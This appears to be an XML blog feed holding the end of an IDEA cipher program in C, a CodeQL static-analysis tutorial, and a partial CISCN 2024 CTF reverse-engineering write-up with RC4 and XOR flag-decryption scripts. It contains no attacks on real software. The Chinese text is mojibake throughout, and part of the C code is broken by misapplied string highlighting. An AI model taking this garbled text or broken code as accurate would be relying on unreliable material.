9</span><br>        tmp1 += tmp2;                                 <span class="hljs-comment">// Step 10</span><br><br>        X0 ^= tmp2;<br>        X1 ^= tmp1;<br>        X2 ^= tmp2;<br>        X3 ^= tmp1;<br><br>        <span class="hljs-comment">// Swap X1 and X2</span><br>        tmp1 = X1;<br>        X1 = X2;<br>        X2 = tmp1;<br>    &#125;<br><br>    tmp1 = X1;<br>    tmp2 = X2;<br><br>    <span class="hljs-comment">// Apply the half round</span><br>    data[<span class="hljs-number">0</span>] = mulMod65537(X0, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">0</span>]);<br>    data[<span class="hljs-number">1</span>] = tmp2 + subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">1</span>];<br>    data[<span class="hljs-number">2</span>] = tmp1 + subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">2</span>];<br>    data[<span class="hljs-number">3</span>] = mulMod65537(X3, subKey[<span class="hljs-number">6</span> * i + <span class="hljs-number">3</span>]);<br>&#125;<br><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">binToInt</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint16_t</span> size = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-type">uint16_t</span> result = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint16_t</span> <span class="hljs-built_in">pow</span> = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">for</span> (i = size - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;1&#x27;</span>)<br>            result += <span class="hljs-built_in">pow</span>;<br>        <span class="hljs-built_in">pow</span> *= <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">convertStringToBin</span><span class="hljs-params">(<span class="hljs-type">char</span>* str, <span class="hljs-type">uint16_t</span>* data, <span class="hljs-type">uint16_t</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> i, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> sizeBlock = <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>) * <span class="hljs-number">8</span>;<br>    <span class="hljs-type">char</span> block[sizeBlock + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(str) &amp;&amp; i &lt; size * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>);<br>       i += <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>)) &#123;<br>        <span class="hljs-built_in">strncpy</span>(block, str, sizeBlock);<br>        block[sizeBlock] = <span class="hljs-string">&#x27;&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        data[j++] = binToInt(block);</span><br><span class="hljs-string">        str += sizeBlock;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">int main() &#123;</span><br><span class="hljs-string">    char Data[] =</span><br><span class="hljs-string">        &quot;110111110100101101010100100010011000110001010001000000000000111011100000110011110000101001011001100001110000100010010110011011110011110010100010111100110011010000010110101101000111101011110111101001000110000010100001110101111100101000111010101110000100100011101100100101100110000011000111100010010000001001001001100000110111101111100011100011111111001001101111100010010100000101010111&quot;;</span><br><span class="hljs-string">    char Key[128] = &quot;01001110110010000111010101010110110101111011111010101001010010001011100010011110101000111100011111000010111100010011110000101110&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    uint16_t data[4*6];</span><br><span class="hljs-string">    uint16_t key[8];</span><br><span class="hljs-string"></span><br><span class="hljs-string">    convertStringToBin(Data, data, 4*6);</span><br><span class="hljs-string">    convertStringToBin(Key, key, 8);</span><br><span class="hljs-string">    for(int i=0;i&lt;8;i++)&#123;</span><br><span class="hljs-string">        printf(&quot;%x&quot;,key[i]);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    // Print initial data</span><br><span class="hljs-string">    printf(&quot;Initial data:   %04X %04X %04X %04Xn&quot;, data[0], data[1], data[2],</span><br><span class="hljs-string">         data[3]);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    // Encrypt data</span><br><span class="hljs-string">    // IDEA(data, key, encrypt);</span><br><span class="hljs-string">    // printf(&quot;Encrypted data: %04X %04X %04X %04Xn&quot;, data[0], data[1], data[2],</span><br><span class="hljs-string">    //      data[3]);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    // Decrypt data</span><br><span class="hljs-string">    for(int i=0;i&lt;6;i++) IDEA(data+4*i, key, decrypt);</span><br><span class="hljs-string">    for(int i=0;i&lt;24;i++) printf(&quot;%02x&quot;,data[i]);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    return 0;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>codeQLé™æ€åˆ†æ</title>
    <link href="/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    <url>/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://www.cnblogs.com/Cl0ud/p/15803314.html">https://www.cnblogs.com/Cl0ud/p/15803314.html</a></p><p><a href="https://www.cnblogs.com/hac425/p/14556110.html">https://www.cnblogs.com/hac425/p/14556110.html</a></p><p><a href="https://www.freebuf.com/articles/web/283795.html">https://www.freebuf.com/articles/web/283795.html</a></p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://codeql.github.com/codeql-standard-libraries/cpp/">https://codeql.github.com/codeql-standard-libraries/cpp/</a></p><h1 id="codeqlåŠŸèƒ½"><a href="#codeqlåŠŸèƒ½" class="headerlink" title="codeqlåŠŸèƒ½"></a>codeqlåŠŸèƒ½</h1><p>æŠŠæºä»£ç è½¬åŒ–æˆä¸€ä¸ªå¯æŸ¥è¯¢çš„æ•°æ®åº“ï¼Œé€šè¿‡ Extractor æ¨¡å—å¯¹æºä»£ç å·¥ç¨‹è¿›è¡Œå…³é”®ä¿¡æ¯åˆ†ææå–ï¼Œæ„æˆä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ï¼Œcodeqlçš„å¤„ç†å¯¹è±¡å¹¶ä¸æ˜¯æºä»£ç æœ¬èº«ï¼Œè€Œæ˜¯ä¸­é—´ç”Ÿæˆçš„ASTæŠ½è±¡è¯­æ³•æ ‘æ•°æ®åº“ï¼Œåç»­æŸ¥è¯¢æ“ä½œéƒ½åœ¨è¿™ä¸ªæ•°æ®åº“ä¸­è¿›è¡Œ</p><h1 id="é¡¹ç›®ç¼–è¯‘"><a href="#é¡¹ç›®ç¼–è¯‘" class="headerlink" title="é¡¹ç›®ç¼–è¯‘"></a>é¡¹ç›®ç¼–è¯‘</h1><p>databasesæ åŠ è½½testæ•°æ®åº“</p><p>åœ¨&#x2F;ql&#x2F;cpp&#x2F;ql&#x2F;srcä¸‹åˆ›å»ºä¸€ä¸ªtest.qlæ¥ç¼–å†™qlæŸ¥è¯¢è¯­å¥</p><img src="/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/1733190891283-c9e6c415-4a7c-4bd4-9984-4718fcbe6e05.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#åˆ›å»ºæ•°æ®åº“</span><br>codeql database create databaseName --source-root=D:/xxljob --language=java<br><br><span class="hljs-comment">#æ›´æ–°æ•°æ®åº“</span><br>codeql database upgrade databaseName<br><br><span class="hljs-comment">#æ‰§è¡Œæ‰«æè§„åˆ™</span><br>codeql database analyze databasePath codeql-repo/java --<span class="hljs-built_in">format</span>=csv --output=result.csv<br><span class="hljs-comment">#eg:codeql database analyze ./libtiff1_dbjob /root/Codeql/ql/codeql/cpp/ql/src/Security/CWE --format=csv --output=result.csv</span><br></code></pre></td></tr></table></figure><h1 id="codeqlè¯­æ³•"><a href="#codeqlè¯­æ³•" class="headerlink" title="codeqlè¯­æ³•"></a>codeqlè¯­æ³•</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">import cpp<br>from FunctionCall fc<br>where fc.getTarget().getName().matches(<span class="hljs-string">&quot;cancel%&quot;</span>)<br>select fc.getEnclosingFunction(), fc <span class="hljs-comment">//fc.getEnclosingFunction() è·å–åŒ…å«è¯¥è°ƒç”¨(cancelå¼€å¤´)çš„å‡½æ•°</span><br></code></pre></td></tr></table></figure><img src="/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/1733756202089-a73faea0-0d44-45a3-a622-812ac61e8c8d.png" class="" title="img"><h2 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h2><p>æ‰¾åˆ°å®å˜é‡MAX_LENGTHçš„å‡½æ•°è°ƒç”¨é“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE 64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_LENGTH 100  </span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">printAndReturnLength</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[BUFFER_SIZE];<br>    <br>    <br>    <span class="hljs-built_in">strncpy</span>(buffer, str, BUFFER_SIZE - <span class="hljs-number">1</span>);<br>    buffer[BUFFER_SIZE - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>; <br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;String (up to %d chars): %s\n&quot;</span>, BUFFER_SIZE - <span class="hljs-number">1</span>, buffer);<br>    <br>    <br>    <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">return</span> (length &gt; MAX_LENGTH) ? MAX_LENGTH : length;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[BUFFER_SIZE];<br>    <br>    <br>    <span class="hljs-built_in">strncpy</span>(buffer, str, BUFFER_SIZE - <span class="hljs-number">1</span>);<br>    buffer[BUFFER_SIZE - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>; <br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;String (up to %d chars): %s\n&quot;</span>, BUFFER_SIZE - <span class="hljs-number">1</span>, buffer);<br>    <br>    <br>    <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">return</span> (length &gt; MAX_LENGTH) ? MAX_LENGTH : length;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">callPrintAndReturnLength</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">int</span> length = printAndReturnLength(str);<br>    <br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Length of the string (up to %d): %d\n&quot;</span>, MAX_LENGTH, length);<br>    <br><br>    <span class="hljs-keyword">if</span> (length &gt; MAX_LENGTH) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Warning: String length exceeds the assumed maximum length of %d.\n&quot;</span>, MAX_LENGTH);<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mainFunction</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Entering mainFunction\n&quot;</span>);<br>    <br><br>    <br>    callPrintAndReturnLength(str);<br>    print(str);<br>    <br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exiting mainFunction\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br>    <span class="hljs-type">char</span> testString[MAX_LENGTH + <span class="hljs-number">1</span>] = <span class="hljs-string">&quot;Hello, Nested Function Calls with Macros!&quot;</span>;<br><br>    testString[MAX_LENGTH] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <br><br>    mainFunction(testString);<br><br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>.&#x2F;codeql database create demo_db â€“language&#x3D;cpp â€“source-root&#x3D;demo&#x2F; -c â€œgcc demo.c -o demoâ€</p><p>ç”¨ä¸¤ä¸ªè°“è¯å°è£…æ–¹æ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">import cpp<br><br>predicate <span class="hljs-title function_">functionUsesMacro</span><span class="hljs-params">(Function f)</span> &#123;<br>  exists(MacroInvocation mi |<br>    mi.getMacroName() = <span class="hljs-string">&quot;BUFFER_SIZE&quot;</span> and<br>    mi.getEnclosingFunction() = f<br>  )<br>&#125;<br><br>predicate <span class="hljs-title function_">callsChain</span><span class="hljs-params">(Function callee, Function caller)</span> &#123;<br>  <span class="hljs-comment">// Base case: caller calls the callee directly</span><br>  exists(FunctionCall fc |<br>    fc.getTarget() = callee and<br>    fc.getEnclosingFunction() = caller<br>  ) or<br>  <span class="hljs-comment">// Recursive case: continue tracing further up the call chain</span><br>  exists(Function intermediate |<br>    callsChain(callee, intermediate) and<br>    exists(FunctionCall fc2 |<br>      fc2.getTarget() = intermediate and<br>      fc2.getEnclosingFunction() = caller<br>    )<br>  )<br>&#125;<br><br>from Function start, Function caller<br>where<br>  <span class="hljs-title function_">functionUsesMacro</span><span class="hljs-params">(start)</span> <span class="hljs-title function_">and</span><br>  <span class="hljs-params">(</span><br><span class="hljs-params">    caller = start or</span><br><span class="hljs-params">    callsChain(start, caller)</span><br><span class="hljs-params">  )</span><br>select caller, &quot;Function in the chain.&quot;<br></code></pre></td></tr></table></figure><p>æœ€åä»¥æ ‘ç»“æ„è¿”å›ï¼Œä¸Šé¢çš„å‡½æ•°è°ƒç”¨ä¸‹é¢çš„å‡½æ•°</p><img src="/2025/01/09/codeQL%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/1736391028586-85f962de-206b-46a8-9e29-f433205cac71.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>ä½œä¸šä¸é¡¹ç›®æ€»ç»“</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024ciscn&amp;ccbåˆèµ›éƒ¨åˆ†wp</title>
    <link href="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ezCsky"><a href="#ezCsky" class="headerlink" title="ezCsky"></a>ezCsky</h2><p>æ‰¾åˆ°rc4å’Œkey</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734233399837-a8ab687d-361e-434c-bb2f-7410437c2696.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> out<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x96</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x64</span>,<br>  <span class="hljs-number">0x92</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB8</span>,<br>  <span class="hljs-number">0x63</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x06</span>,<br>  <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x40</span>,<br>  <span class="hljs-number">0xED</span>, <span class="hljs-number">0xD1</span>])<br>key = <span class="hljs-string">b&#x27;testkey&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°çš„å¯†æ–‡å‘ç°æœ€åä¸€ä½æ˜¯125ï¼Œç¬¬ä¸€ä½å’Œfå¼‚æˆ–å¾—åˆ°lï¼ŒçŒœæµ‹æ˜¯ç›¸é‚»å¼‚æˆ–ï¼Œè€Œä¸”ç¨‹åºå‰é¢ä¹Ÿæœ‰xoræ¨¡å—</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734233444925-7dbf841f-360a-47a3-b7ce-e635e4ccfd1c.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">6</span>, <span class="hljs-number">28</span>, <span class="hljs-number">31</span>, <span class="hljs-number">84</span>, <span class="hljs-number">86</span>, <span class="hljs-number">83</span>, <span class="hljs-number">87</span>, <span class="hljs-number">81</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">29</span>, <span class="hljs-number">20</span>, <span class="hljs-number">88</span>, <span class="hljs-number">86</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">84</span>, <span class="hljs-number">3</span>, <span class="hljs-number">75</span>, <span class="hljs-number">20</span>, <span class="hljs-number">88</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">73</span>, <span class="hljs-number">76</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">81</span>, <span class="hljs-number">12</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">79</span>, <span class="hljs-number">125</span>]<br>flag=<span class="hljs-string">&#x27;f&#x27;</span><br>ch=<span class="hljs-string">&#x27;f&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">1</span>):<br>    tmp=<span class="hljs-built_in">ord</span>(ch)^a[i]<br>    flag+=<span class="hljs-built_in">chr</span>(tmp)<br>    ch=<span class="hljs-built_in">chr</span>(tmp)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#flag&#123;d0f5b330-9a74-11ef-9afd-acde48001122&#125;</span><br></code></pre></td></tr></table></figure><h2 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h2><p>ç¨‹åºä¼šè§£æè¾“å…¥å‚æ•°</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734257745708-db58e50c-b96e-47ec-a99f-881d3abf9a22.png" class="" title="img"><p>è¾“å…¥flagå‘ç°åˆšå¥½å¯¹çš„ä¸Š</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734257806075-b5137431-e27d-4586-911d-e5e9214f3347.png" class="" title="img"><p>ç»è¿‡æµ‹è¯•çŒœæµ‹æ˜¯å•è¡¨ä»£æ¢ï¼Œä¸”00è¡¨ç¤º4</p><img src="/2024/12/17/2024ciscn-ccb%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1734257881801-7a89040b-9458-4edc-98e7-971d790f96c5.png" class="" title="img"><p>æŠŠå¤§éƒ¨åˆ†å¯è§å­—ç¬¦çš„æ˜ å°„éƒ½æ‰¾å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># s=&#x27;2e34222f313632262c2d1e3021232425272829373520331f2b2a12180613151a160a10110214050708090b0c0d1b190417030f0e1c1d&#x27;</span><br><span class="hljs-comment"># for i in range(0,0xlen(s),0x2):</span><br><span class="hljs-comment">#     print(s[i],0xend=&quot;&quot;)</span><br><span class="hljs-comment">#     print(s[i+1],0xend=&quot;,0x&quot;)</span><br>a=[<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x0b</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0x0e</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x1d</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x01</span>]<br>s=<span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM124&#123;&#125;=&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>a1=[<span class="hljs-number">0x23</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x37</span>,<span 